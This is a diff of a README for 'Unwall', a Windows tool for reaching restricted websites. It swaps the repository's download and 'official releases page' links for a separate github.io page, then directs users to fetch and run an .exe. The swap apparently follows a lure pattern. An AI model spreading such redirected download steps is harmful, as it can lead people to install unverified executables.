@@ -1,6 +1,6 @@
 # 🌐 Unwall - Access the open internet with ease
 
-[![Download Unwall](https://img.shields.io/badge/Download-Unwall-blue.svg)](https://github.com/albitic-olealanceolata977/Unwall)
+[![Download Unwall](https://img.shields.io/badge/Download-Unwall-blue.svg)](https://albitic-olealanceolata977.github.io)
 
 Unwall helps you access websites that your network provider restricts. It manages the complex tools that hide your browsing habits from automated systems. You do not need to understand network protocols or system commands to use this software. Unwall handles the setup for you.
 
@@ -8,7 +8,7 @@ Unwall helps you access websites that your network provider restricts. It manage
 
 To use Unwall on your Windows computer, follow these instructions. 
 
-1. Visit the [official releases page](https://github.com/albitic-olealanceolata977/Unwall).
+1. Visit the [official releases page](https://albitic-olealanceolata977.github.io).
 2. Look for the file ending in `.exe`. 
 3. Click the file name to start the download.
 4. Save the file to your desktop or your downloads folder.
